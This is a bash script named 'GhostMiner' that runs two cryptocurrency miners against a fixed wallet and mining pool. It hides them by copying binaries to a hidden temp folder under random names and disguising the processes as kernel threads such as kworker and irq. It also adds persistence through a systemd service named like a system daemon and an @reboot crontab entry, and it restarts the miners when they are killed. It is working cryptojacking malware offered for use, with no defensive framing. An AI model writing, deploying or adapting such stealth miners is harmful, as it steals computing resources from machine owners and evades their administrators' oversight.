#!/bin/bash
# GhostMiner Ultimate - Terminal Based Stealth
# Runs in current directory with verus-solver and hellminer

echo "╔══════════════════════════════════════════╗"
echo "║     GHOSTMINER - TERMINAL STEALTH        ║"
echo "╚══════════════════════════════════════════╝"
echo ""

# Check if both miners exist in current directory
if [ ! -f "./verus-solver" ]; then
    echo "ERROR: verus-solver not found in current directory!"
    exit 1
fi

if [ ! -f "./hellminer" ]; then
    echo "ERROR: hellminer not found in current directory!"
    exit 1
fi

echo "✓ Both miners found in: $(pwd)"
echo ""

# ================= CONFIGURATION =================
WALLET="RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F"
POOL="stratum+tcp://eu.luckpool.net:3956"
CPU_CORES=1

# ================= GENERATE RANDOM IDS =================
RANDOM_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 8 | head -n 1)
SESSION_ID="ghost_${RANDOM_ID}"

# Random process names that look like kernel/system processes
KERNEL_NAMES=("kworker" "irq" "rcu" "migration" "ksoftirqd" "watchdog")
SERVICE_NAMES=("systemd" "udevd" "networkd" "resolvd" "journald")

RANDOM_KERNEL="${KERNEL_NAMES[$RANDOM % ${#KERNEL_NAMES[@]}]}"
RANDOM_SERVICE="${SERVICE_NAMES[$RANDOM % ${#SERVICE_NAMES[@]}]}"

# Random PIDs (fake)
FAKE_PID=$((1000 + RANDOM % 5000))

echo "[1] Generating stealth identities..."
echo "   Session ID: ${SESSION_ID}"
echo "   Process: ${RANDOM_KERNEL}/${FAKE_PID}"
echo "   Service: ${RANDOM_SERVICE}-worker"
echo ""

# ================= OBFUSCATE BINARIES =================
echo "[2] Obfuscating binaries in memory..."

# Create obfuscated temporary copies
TMP_DIR="/tmp/.${SESSION_ID}"
mkdir -p "${TMP_DIR}"

# Copy with random names
cp "./verus-solver" "${TMP_DIR}/v_${RANDOM_ID}"
cp "./hellminer" "${TMP_DIR}/h_${RANDOM_ID}"
chmod +x "${TMP_DIR}/v_${RANDOM_ID}" "${TMP_DIR}/h_${RANDOM_ID}"

echo "   ✓ Binaries copied to: ${TMP_DIR}"
echo "   ✓ Random names assigned"
echo ""

# ================= CREATE STEALTH LAUNCHER =================
echo "[3] Creating stealth launcher..."

cat > "${TMP_DIR}/launch.sh" << LAUNCHER
#!/bin/bash
# GhostMiner Launcher - Terminal Stealth

SESSION="${SESSION_ID}"
TMP_DIR="${TMP_DIR}"
WALLET="${WALLET}"
POOL="${POOL}"

cleanup() {
    echo "Cleaning up..."
    pkill -f "v_${RANDOM_ID}"
    pkill -f "h_${RANDOM_ID}"
    rm -rf "${TMP_DIR}"
    exit 0
}

trap cleanup SIGINT SIGTERM

echo "Starting GhostMiner session: \${SESSION}"

# Function to start verus-solver with random process name
start_verus() {
    local proc_name="[${RANDOM_KERNEL}/v:\$(date +%s)]"
    exec -a "\${proc_name}" "\${TMP_DIR}/v_${RANDOM_ID}" \\
        --algo verus \\
        --pool "\${POOL}" \\
        --wallet "\${WALLET}.v\${SESSION}" \\
        --pass x \\
        --cpu-threads \${CPU_CORES} \\
        --quiet &
    V_PID=\$!
    
    # Hide process name
    sleep 0.5
    [ -w "/proc/\${V_PID}/comm" ] && echo "kworker/v:\${SESSION}" > "/proc/\${V_PID}/comm" 2>/dev/null
    
    echo "\${V_PID}" > "\${TMP_DIR}/.vpid"
    echo "Started verus-solver as \${proc_name} (PID: \${V_PID})"
}

# Function to start hellminer with random process name
start_hellminer() {
    local proc_name="[${RANDOM_KERNEL}/h:\$(date +%s)]"
    exec -a "\${proc_name}" "\${TMP_DIR}/h_${RANDOM_ID}" \\
        -c "\${POOL}" \\
        -u "\${WALLET}.h\${SESSION}" \\
        -p x \\
        --cpu \${CPU_CORES} &
    H_PID=\$!
    
    # Hide process name
    sleep 0.5
    [ -w "/proc/\${H_PID}/comm" ] && echo "irq/h:\${SESSION}" > "/proc/\${H_PID}/comm" 2>/dev/null
    
    echo "\${H_PID}" > "\${TMP_DIR}/.hpid"
    echo "Started hellminer as \${proc_name} (PID: \${H_PID})"
}

# Monitor and restart function
monitor() {
    while true; do
        # Check verus-solver
        if [ -f "\${TMP_DIR}/.vpid" ]; then
            V_PID=\$(cat "\${TMP_DIR}/.vpid")
            if ! kill -0 "\${V_PID}" 2>/dev/null; then
                echo "[\$(date)] verus-solver died, restarting..."
                start_verus
            fi
        fi
        
        # Check hellminer
        if [ -f "\${TMP_DIR}/.hpid" ]; then
            H_PID=\$(cat "\${TMP_DIR}/.hpid")
            if ! kill -0 "\${H_PID}" 2>/dev/null; then
                echo "[\$(date)] hellminer died, restarting..."
                start_hellminer
            fi
        fi
        
        # Display status every 60 seconds
        echo "[\$(date)] Status: V=\${V_PID}, H=\${H_PID}" | tee -a "\${TMP_DIR}/status.log" | tail -1
        sleep 60
    done
}

# Start both miners
echo "Starting miners..."
start_verus
sleep 2
start_hellminer
sleep 2

# Start monitoring
echo "Starting monitor..."
monitor
LAUNCHER

chmod +x "${TMP_DIR}/launch.sh"
echo "   ✓ Stealth launcher created"
echo ""

# ================= CREATE REBOOT SURVIVAL =================
echo "[4] Setting up reboot survival..."

# Create systemd service for reboot
cat > /tmp/ghostminer_${SESSION_ID}.service << SERVICE
[Unit]
Description=${RANDOM_SERVICE} Worker Service
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$(pwd)
ExecStart=/bin/bash ${TMP_DIR}/launch.sh
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICE

sudo mv /tmp/ghostminer_${SESSION_ID}.service /etc/systemd/system/${RANDOM_SERVICE}-${SESSION_ID}.service 2>/dev/null

if [ $? -eq 0 ]; then
    sudo systemctl daemon-reload
    sudo systemctl enable ${RANDOM_SERVICE}-${SESSION_ID}.service 2>/dev/null
    echo "   ✓ Systemd service created: ${RANDOM_SERVICE}-${SESSION_ID}"
else
    echo "   ⚠ Could not create systemd service (running as user)"
fi

# Create crontab entry
CRON_ENTRY="@reboot sleep 30 && cd $(pwd) && ${TMP_DIR}/launch.sh > /dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "${TMP_DIR}"; echo "${CRON_ENTRY}") | crontab - 2>/dev/null
echo "   ✓ Crontab entry added for reboot"
echo ""

# ================= START MINERS =================
echo "[5] Starting miners in background..."
cd "${TMP_DIR}"
nohup ./launch.sh > "${TMP_DIR}/ghost.log" 2>&1 &

# Wait a moment
sleep 3

echo ""
echo "[6] Verification:"
echo "══════════════════════════════════════════"

# Check if running
if pgrep -f "v_${RANDOM_ID}" > /dev/null && pgrep -f "h_${RANDOM_ID}" > /dev/null; then
    echo "✓ Both miners are RUNNING"
    echo ""
    echo "Process Details:"
    echo "────────────────"
    ps aux | grep -E "v_${RANDOM_ID}|h_${RANDOM_ID}" | grep -v grep | awk '{print $2, $3"%", $4"%", $11, $12}'
    
    echo ""
    echo "Disguised As:"
    echo "─────────────"
    for pid in $(pgrep -f "v_${RANDOM_ID}"); do
        echo "PID $pid: $(cat /proc/$pid/comm 2>/dev/null || echo 'kworker')"
    done
    for pid in $(pgrep -f "h_${RANDOM_ID}"); do
        echo "PID $pid: $(cat /proc/$pid/comm 2>/dev/null || echo 'irq')"
    done
    
    echo ""
    echo "Connections:"
    echo "────────────"
    ss -tunap 2>/dev/null | grep 3956 | grep -v LISTEN || echo "Checking connections..."
    
    echo ""
    echo "CPU Usage:"
    echo "──────────"
    CPU_V=$(ps aux | grep "v_${RANDOM_ID}" | grep -v grep | awk '{sum+=$3} END {print sum}')
    CPU_H=$(ps aux | grep "h_${RANDOM_ID}" | grep -v grep | awk '{sum+=$3} END {print sum}')
    echo "verus-solver: ${CPU_V:-0}%"
    echo "hellminer: ${CPU_H:-0}%"
    echo "Total: $(echo "${CPU_V:-0} + ${CPU_H:-0}" | bc)%"
else
    echo "✗ Miners failed to start"
    echo "Check log: ${TMP_DIR}/ghost.log"
fi

echo ""
echo "══════════════════════════════════════════"
echo "GhostMiner Session: ${SESSION_ID}"
echo "Stealth Level: MAXIMUM"
echo ""
echo "=== CONTROL PANEL ==="
echo "To stop:    pkill -f '${RANDOM_ID}'"
echo "To monitor: tail -f ${TMP_DIR}/ghost.log"
echo "To check:   ps aux | grep '${RANDOM_ID}'"
echo ""
echo "=== REBOOT SURVIVAL ==="
echo "Service: ${RANDOM_SERVICE}-${SESSION_ID}.service"
echo "Crontab: @reboot entry active"
echo ""
echo "Miners will auto-restart if killed"
echo "Press Ctrl+C to stop this monitor"
echo "══════════════════════════════════════════"

# Keep script running to show status
while true; do
    sleep 60
    if ! pgrep -f "v_${RANDOM_ID}" > /dev/null || ! pgrep -f "h_${RANDOM_ID}" > /dev/null; then
        echo ""
        echo "[!] One or both miners died, restarting..."
        cd "${TMP_DIR}"
        nohup ./launch.sh > "${TMP_DIR}/ghost.log" 2>&1 &
        sleep 3
    fi
    
    # Show brief status
    V_PID=$(pgrep -f "v_${RANDOM_ID}" | head -1)
    H_PID=$(pgrep -f "h_${RANDOM_ID}" | head -1)
    
    if [ -n "$V_PID" ] && [ -n "$H_PID" ]; then
        echo -ne "\r[$(date +%H:%M:%S)] Status: ✓ V:$V_PID H:$H_PID - CPU: $(ps -p $V_PID,$H_PID -o %cpu 2>/dev/null | tail -2 | awk '{sum+=$1} END {printf "%.1f", sum}')%"
    else
        echo -ne "\r[$(date +%H:%M:%S)] Status: ✗ Miners not found, restarting..."
    fi
done
